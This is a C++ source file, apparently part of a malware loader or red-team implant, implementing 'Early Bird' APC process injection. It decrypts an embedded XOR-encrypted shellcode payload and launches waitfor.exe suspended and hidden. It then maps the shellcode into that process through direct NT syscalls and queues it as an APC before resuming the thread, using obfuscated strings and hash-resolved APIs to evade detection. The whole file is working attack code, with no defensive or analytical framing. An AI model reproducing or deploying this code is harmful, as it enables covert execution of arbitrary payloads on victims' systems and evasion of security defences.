#include "inject.hpp"
#include "syscalls.hpp"
#include "embeds.hpp"
#include "xor.hpp"
#include "obfuscation.hpp"
#include "handler_util.hpp"
#include "util.hpp"

DWORD InjectAndSpawn(shared_func_pointers* fp, logger_ctx* log_ctx) {
    DWORD result;
    HANDLE h_process = NULL;
    HANDLE h_thread = NULL;
    LPVOID local_shellcode = NULL;
    HANDLE h_section = NULL;
    PVOID  local_view = NULL;
    PVOID  remote_view = NULL;

    result = InitSyscalls();
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(log_ctx, XorString("Failed to initialize syscalls. Error code: %d"), result);
        return result;
    }

    VirtualAlloc_t fp_VirtualAlloc = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualAlloc);
    if (!fp_VirtualAlloc) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve VirtualAlloc"));
        return FAIL_GET_VIRTUALALLOC;
    }

    do {
        AesLogger::LogDebug(log_ctx, XorString("Decrypting embedded shellcode."));

        unsigned char key[PAYLOAD_KEY_LEN];
        memcpy(key, embedded::payload_key.data(), PAYLOAD_KEY_LEN);
        encryption::XorInPlace(key, PAYLOAD_KEY_LEN, KEY_XOR_KEY);

        size_t shellcode_size = embedded::payload.size();
        local_shellcode = fp_VirtualAlloc(NULL, shellcode_size, MEM_COMMIT, PAGE_READWRITE);
        if (!local_shellcode) {
            result = fp->fp_GetLastError();
            AesLogger::LogError(log_ctx, XorString("Failed to allocate local shellcode buffer. Error code: %d"), result);
            break;
        }
        memcpy(local_shellcode, embedded::payload.data(), shellcode_size);
        encryption::TripleXorInPlace((unsigned char*)local_shellcode, shellcode_size, key, PAYLOAD_KEY_LEN);
        pi_memset(key, 0, PAYLOAD_KEY_LEN);

        AesLogger::LogDebug(log_ctx, XorString("Creating waitfor.exe suspended via CreateProcessW."));

        CreateProcessW_t fp_CreateProcessW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateProcessW);
        if (!fp_CreateProcessW) {
            AesLogger::LogError(log_ctx, XorString("Failed to resolve CreateProcessW"));
            result = FAIL_GET_CREATEPROCESSW;
            break;
        }

        wchar_t* waitfor_cmd = XorStringW(L"waitfor.exe /T 99999 Evt8a3f1d7c2e");
        STARTUPINFOW startup_info;
        PROCESS_INFORMATION process_info;
        ZeroMemory(&startup_info, sizeof(startup_info));
        ZeroMemory(&process_info, sizeof(process_info));
        startup_info.cb = sizeof(startup_info);

        if (!fp_CreateProcessW(
            NULL,
            waitfor_cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info
        )) {
            result = fp->fp_GetLastError();
            AesLogger::LogError(log_ctx, XorString("CreateProcessW failed. Error code: %d"), result);
            break;
        }

        h_process = process_info.hProcess;
        h_thread = process_info.hThread;

        AesLogger::LogInfo(log_ctx, XorString("Created suspended waitfor.exe. PID=%d"), process_info.dwProcessId);

        AesLogger::LogDebug(log_ctx, XorString("Creating shared section."));
        NTSTATUS status;
        LARGE_INTEGER section_size;
        section_size.QuadPart = static_cast<LONGLONG>(shellcode_size);

        status = SysNtCreateSection(
            &h_section,
            SECTION_ALL_ACCESS,
            NULL,
            &section_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            NULL
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtCreateSection failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogDebug(log_ctx, XorString("Mapping section into local process."));
        SIZE_T local_view_size = 0;
        status = SysNtMapViewOfSection(
            h_section,
            (HANDLE)-1,
            &local_view,
            0, 0, NULL,
            &local_view_size,
            ViewUnmap,
            0,
            PAGE_READWRITE
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtMapViewOfSection (local) failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogDebug(log_ctx, XorString("Copying shellcode to local view."));
        memcpy(local_view, local_shellcode, shellcode_size);

        AesLogger::LogDebug(log_ctx, XorString("Mapping section into waitfor.exe."));
        SIZE_T remote_view_size = 0;
        status = SysNtMapViewOfSection(
            h_section,
            h_process,
            &remote_view,
            0, 0, NULL,
            &remote_view_size,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READ
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtMapViewOfSection (remote) failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        SysNtUnmapViewOfSection((HANDLE)-1, local_view);
        local_view = NULL;

        AesLogger::LogDebug(log_ctx, XorString("Queuing APC to main thread."));
        status = SysNtQueueApcThread(
            h_thread,
            remote_view,
            NULL,
            NULL,
            NULL
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtQueueApcThread failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogDebug(log_ctx, XorString("Resuming waitfor.exe main thread."));
        status = SysNtResumeThread(h_thread, NULL);
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtResumeThread failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogSuccess(log_ctx, XorString("Early Bird APC injection complete. Shellcode running in waitfor.exe."));
        result = ERROR_SUCCESS;
    } while (false);

    if (local_view) {
        SysNtUnmapViewOfSection((HANDLE)-1, local_view);
    }
    if (h_section) {
        fp->fp_CloseHandle(h_section);
    }
    if (h_process) {
        fp->fp_CloseHandle(h_process);
    }
    if (h_thread) {
        fp->fp_CloseHandle(h_thread);
    }

    if (local_shellcode) {
        VirtualFree_t fp_VirtualFree = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualFree);
        if (fp_VirtualFree) {
            fp_VirtualFree(local_shellcode, 0, MEM_RELEASE);
        }
    }

    return result;
}
